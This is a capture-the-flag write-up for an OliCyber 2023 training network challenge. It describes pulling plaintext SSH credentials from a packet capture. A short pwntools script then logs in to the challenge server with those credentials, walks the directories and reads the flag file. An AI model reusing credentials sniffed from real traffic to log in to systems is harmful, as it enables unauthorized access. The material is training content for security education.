# SSH login

| | |
|---|---|
| **Section** | OliCyber 2023 Training Camp 2 |
| **Category** | network |
| **Solves** | 427 |

## Overview

The challenge provides a network capture containing an intercepted login session and a remote service accessible via netcat.

## Solve

Inspecting the PCAP reveals the SSH credentials in plaintext.

Using the recovered username and password, it is possible to authenticate to the remote service and navigate the filesystem until reaching the flag file:

```python
from pwn import *

chall = remote("ssh.challs.olicyber.it", 34009)

chall.sendline(b"gabibbo")
chall.sendline(b"p4ssw0rd_SSH_s3gr3t4")
chall.sendline(b"cd Desktop")
chall.sendline(b"cd olicyber")
chall.sendline(b"cd 2022")
chall.sendline(b"cd Olicyber_git_repository_2022")
chall.sendline(b"cd network_brutta")
chall.sendline(b"cat flag.txt")

data = chall.recvuntil(b"}").decode()
flag = "flag{" + data.split("flag{")[-1]

print(flag)
```